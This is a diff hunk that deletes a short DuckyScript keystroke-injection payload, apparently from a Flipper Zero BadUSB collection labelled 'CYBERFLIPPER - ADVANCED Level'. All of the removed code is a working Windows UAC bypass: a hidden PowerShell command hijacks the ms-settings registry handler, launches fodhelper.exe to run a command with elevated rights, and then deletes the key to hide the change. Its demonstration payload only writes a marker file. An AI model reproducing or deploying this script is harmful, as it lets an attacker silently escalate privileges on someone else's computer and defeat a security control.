@@ -1,7 +1,0 @@
-REM CYBERFLIPPER - ADVANCED Level
-REM UAC Bypass - Fodhelper registry hijack technique
-DELAY 500
-GUI r
-DELAY 300
-STRING powershell -W Hidden -C "New-Item 'HKCU:\Software\Classes\ms-settings\shell\open\command' -F;Set-ItemProperty 'HKCU:\Software\Classes\ms-settings\shell\open\command' '(Default)' 'cmd /c echo UAC_BYPASSED > %TEMP%\uac.txt' -F;Set-ItemProperty 'HKCU:\Software\Classes\ms-settings\shell\open\command' 'DelegateExecute' '' -F;Start-Process fodhelper.exe;sleep 3;Remove-Item 'HKCU:\Software\Classes\ms-settings\' -R -F"
-ENTER
